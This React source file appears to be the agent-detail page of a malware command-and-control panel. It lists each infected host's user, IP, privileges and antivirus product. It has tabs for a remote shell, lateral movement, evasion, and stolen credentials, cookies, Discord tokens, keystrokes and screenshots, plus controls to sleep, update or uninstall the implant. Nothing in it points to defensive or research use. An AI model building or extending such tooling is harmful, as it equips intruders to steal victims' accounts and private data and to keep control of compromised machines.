import * as React from "react"
import { useParams, useNavigate } from "react-router-dom"
import { motion, AnimatePresence } from "framer-motion"
import { GradientText } from '@/components/ui/GradientText'
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { Textarea } from '@/components/ui/Textarea'
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
import { useAgentStore } from '@/stores/agentStore'
import { useAuthStore } from '@/stores/authStore'
import { AgentDetailContent } from '@/components/agents/AgentDetailContent'
import { DropdownMenu, DropdownMenuTrigger, DropdownMenuContent, DropdownMenuItem, DropdownMenuSeparator, DropdownMenuLabel } from '@/components/ui/DropdownMenu'
import {
  ArrowLeft,
  Monitor,
  Terminal,
  Camera,
  Download,
  Network,
  Shield,
  Bug,
  Settings,
  Loader2,
  Wifi,
  WifiOff,
  Zap,
  Crown,
  Cpu,
  Globe,
  User,
  Shield as ShieldIcon,
  AlertTriangle,
  MoreVertical,
  RefreshCw,
  Play,
  Pause,
  Power,
  Copy,
  Trash2,
  Maximize2,
  Minimize2,
  LayoutDashboard,
  SquarePen,
  Search,
  Filter,
} from "lucide-react"
import { cn } from '@/lib/utils'
import { formatDistanceToNow } from 'date-fns'

export function AgentDetailPage() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const { fetchAgent, fetchTasks, fetchFileTransfers, fetchCredentials, fetchCookies, fetchDiscordTokens, fetchKeystrokes, fetchScreenshots, fetchProcesses, fetchLateralMoves, fetchEvasionResults, fetchModules, selectedAgent, setSelectedAgent, connectWS, disconnectWS, wsConnected, loading } = useAgentStore()
  const { user } = useAuthStore()

  React.useEffect(() => {
    if (!id) return
    fetchAgent(id)
    fetchTasks(id)
    fetchFileTransfers(id)
    fetchCredentials(id)
    fetchCookies(id)
    fetchDiscordTokens(id)
    fetchKeystrokes(id)
    fetchScreenshots(id)
    fetchProcesses(id)
    fetchLateralMoves(id)
    fetchEvasionResults(id)
    fetchModules(id)
    connectWS(id)

    return () => {
      disconnectWS()
      setSelectedAgent(null)
    }
  }, [id])

  if (!selectedAgent) {
    return (
      <div className="flex items-center justify-center h-[60vh]">
        <div className="text-center">
          <Loader2 className="w-10 h-10 animate-spin text-accent-400 mx-auto mb-4" />
          <p className="text-dark-400">Loading agent details...</p>
        </div>
      </div>
    )
  }

  const agent = selectedAgent
  const statusConfig = {
    active: { icon: Wifi, color: 'text-green-400', bg: 'bg-green-500/10', label: 'Active', pulse: true },
    idle: { icon: Zap, color: 'text-yellow-400', bg: 'bg-yellow-500/10', label: 'Idle', pulse: false },
    offline: { icon: WifiOff, color: 'text-red-400', bg: 'bg-red-500/10', label: 'Offline', pulse: false },
  }
  const status = statusConfig[agent.Status] || statusConfig.offline
  const StatusIcon = status.icon

  const tabs = [
    { id: 'shell', label: 'Shell', icon: Terminal },
    { id: 'screenshot', label: 'Screenshots', icon: Camera },
    { id: 'files', label: 'Files', icon: Download },
    { id: 'processes', label: 'Processes', icon: Network },
    { id: 'lateral', label: 'Lateral', icon: Bug },
    { id: 'evasion', label: 'Evasion', icon: Shield },
    { id: 'modules', label: 'Modules', icon: Settings },
    { id: 'credentials', label: 'Credentials', icon: ShieldIcon },
    { id: 'cookies', label: 'Cookies', icon: AlertTriangle },
    { id: 'discord', label: 'Discord', icon: MoreVertical },
    { id: 'keystrokes', label: 'Keystrokes', icon: SquarePen },
  ]

  return (
    <div className="space-y-6 animate-fade-in h-full">
      {/* Agent Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4 }}
        className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4"
      >
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="icon" onClick={() => navigate('/agents')}>
            <ArrowLeft className="w-4 h-4" />
          </Button>
          <div className={cn("w-16 h-16 rounded-xl flex items-center justify-center relative", status.bg)}>
            <Monitor className={cn("w-8 h-8", status.color)} />
            {status.pulse && (
              <motion.div
                className="absolute inset-0 rounded-xl"
                style={{ backgroundColor: status.color.replace('text-', 'bg-').replace('400', '500') }}
                animate={{ scale: [1, 1.4, 1], opacity: [0.3, 0, 0.3] }}
                transition={{ duration: 2, repeat: Infinity }}
              />
            )}
          </div>
          <div>
            <div className="flex items-center gap-3">
              <GradientText className="text-2xl font-bold" colors={['#fff', '#d946ef', '#a855f7']}>
                {agent.Hostname}
              </GradientText>
              <span className={cn(
                "px-3 py-1 rounded-full text-xs font-medium flex items-center gap-1.5",
                status.bg.replace('/10', '/20'),
                status.color
              )}>
                <StatusIcon className="w-3.5 h-3.5" />
                {status.label}
              </span>
              {agent.IsAdmin && (
                <span className="px-2 py-1 rounded-full text-xs font-medium bg-yellow-500/20 text-yellow-400 flex items-center gap-1">
                  <Crown className="w-3 h-3" />
                  Admin
                </span>
              )}
            </div>
            <div className="flex flex-wrap items-center gap-4 mt-1 text-sm text-dark-400">
              <span className="flex items-center gap-1 font-mono">
                <User className="w-3.5 h-3.5" />
                {agent.Username}
              </span>
              <span className="flex items-center gap-1 font-mono">
                <Globe className="w-3.5 h-3.5" />
                {agent.IP}
              </span>
              <span className="flex items-center gap-1 font-mono">
                <Cpu className="w-3.5 h-3.5" />
                {agent.OS} {agent.Arch}
              </span>
              <span className="flex items-center gap-1 font-mono">
                <ShieldIcon className="w-3.5 h-3.5" />
                {agent.AV || 'Unknown'}
              </span>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-3 lg:ml-auto">
          <div className={cn(
            "flex items-center gap-2 px-3 py-1 rounded-full text-xs font-medium",
            wsConnected ? "bg-green-500/10 text-green-400" : "bg-red-500/10 text-red-400"
          )}>
            <span className={cn("w-2 h-2 rounded-full", wsConnected ? "bg-green-400 animate-pulse" : "bg-red-400")} />
            {wsConnected ? 'Live' : 'Disconnected'}
          </div>
          <Button variant="outline" size="sm" onClick={() => { if (id) fetchAgent(id) }} disabled={loading}>
            <RefreshCw className={cn("w-4 h-4", loading && "animate-spin")} />
            Refresh
          </Button>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="icon">
                <MoreVertical className="w-4 h-4" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="min-w-[200px]">
              <DropdownMenuLabel className="font-mono text-xs">Agent Actions</DropdownMenuLabel>
              <DropdownMenuItem onClick={() => navigator.clipboard.writeText(agent.ID)} className="flex items-center gap-2">
                <Copy className="w-4 h-4" />
                Copy Agent ID
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => alert('Sleep agent')} className="flex items-center gap-2 text-yellow-400">
                <Pause className="w-4 h-4" />
                Sleep Agent
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => alert('Update agent binary')} className="flex items-center gap-2 text-blue-400">
                <RefreshCw className="w-4 h-4" />
                Update Binary
              </DropdownMenuItem>
              <DropdownMenuSeparator />
              <DropdownMenuItem onClick={() => { if (confirm('Uninstall agent?')) alert('Uninstall sent') }} className="flex items-center gap-2 text-red-400">
                <Power className="w-4 h-4" />
                Uninstall Agent
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => { if (confirm('Delete agent record?')) alert('Deleted') }} className="flex items-center gap-2 text-red-400">
                <Trash2 className="w-4 h-4" />
                Delete Record
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </motion.div>

      {/* System Info Cards */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: 0.1 }}
        className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-4"
      >
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-blue-500/10 rounded-lg text-blue-400">
                <User className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">Username</p>
                <p className="font-mono text-dark-100">{agent.Username}</p>
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-green-500/10 rounded-lg text-green-400">
                <Globe className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">IP Address</p>
                <p className="font-mono text-dark-100">{agent.IP}</p>
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-purple-500/10 rounded-lg text-purple-400">
                <Cpu className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">Architecture</p>
                <p className="font-mono text-dark-100">{agent.Arch}</p>
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-orange-500/10 rounded-lg text-orange-400">
                <Settings className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">OS Version</p>
                <p className="font-mono text-dark-100 truncate max-w-[120px]">{agent.OS}</p>
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-yellow-500/10 rounded-lg text-yellow-400">
                <Crown className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">Privileges</p>
                <p className="font-mono text-dark-100">{agent.IsAdmin ? 'Administrator' : 'Standard User'}</p>
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-red-500/10 rounded-lg text-red-400">
                <ShieldIcon className="w-5 h-5" />
              </div>
              <div>
                <p className="text-sm text-dark-400">AV/EDR</p>
                <p className="font-mono text-dark-100 truncate max-w-[120px]">{agent.AV || 'None Detected'}</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </motion.div>

      {/* Metadata Row */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: 0.15 }}
        className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4"
      >
        <Card className="card-hover">
          <CardContent className="p-4">
            <p className="text-sm text-dark-400 mb-1">Agent Version</p>
            <p className="font-mono text-dark-100">{agent.Version}</p>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <p className="text-sm text-dark-400 mb-1">Process ID</p>
            <p className="font-mono text-dark-100">{agent.PID}</p>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <p className="text-sm text-dark-400 mb-1">Last Seen</p>
            <p className="font-mono text-dark-100">
              {agent.LastSeen ? formatDistanceToNow(new Date(agent.LastSeen), { addSuffix: true }) : 'Never'}
            </p>
          </CardContent>
        </Card>
        <Card className="card-hover">
          <CardContent className="p-4">
            <p className="text-sm text-dark-400 mb-1">First Seen</p>
            <p className="font-mono text-dark-100">
              {agent.FirstSeen ? formatDistanceToNow(new Date(agent.FirstSeen), { addSuffix: true }) : 'Unknown'}
            </p>
          </CardContent>
        </Card>
      </motion.div>

      {/* Main Content Tabs */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: 0.2 }}
        className="h-[calc(100vh-400px)] min-h-[500px]"
      >
        <Tabs defaultValue="shell" className="h-full">
          <TabsList className="grid w-full grid-cols-6 lg:grid-cols-12 gap-1 bg-dark-800/50 p-1 rounded-lg border border-dark-700">
            {tabs.map((tab) => {
              const Icon = tab.icon
              return (
                <TabsTrigger key={tab.id} value={tab.id} className="gap-2 data-[state=active]:bg-accent-500/20 data-[state=active]:text-accent-400 data-[state=active]:border-accent-500/30">
                  <Icon className="w-4 h-4" />
                  <span className="hidden sm:inline">{tab.label}</span>
                </TabsTrigger>
              )
            })}
          </TabsList>

          <TabsContent value="shell" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="shell" />
          </TabsContent>
          <TabsContent value="screenshot" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="screenshot" />
          </TabsContent>
          <TabsContent value="files" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="files" />
          </TabsContent>
          <TabsContent value="processes" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="processes" />
          </TabsContent>
          <TabsContent value="lateral" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="lateral" />
          </TabsContent>
          <TabsContent value="evasion" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="evasion" />
          </TabsContent>
          <TabsContent value="modules" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="modules" />
          </TabsContent>
          <TabsContent value="credentials" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="credentials" />
          </TabsContent>
          <TabsContent value="cookies" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="cookies" />
          </TabsContent>
          <TabsContent value="discord" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="discord" />
          </TabsContent>
          <TabsContent value="keystrokes" className="h-[calc(100%-50px)]">
            <AgentDetailContent agentId={agent.ID} mode="keystrokes" />
          </TabsContent>
        </Tabs>
      </motion.div>
    </div>
  )
}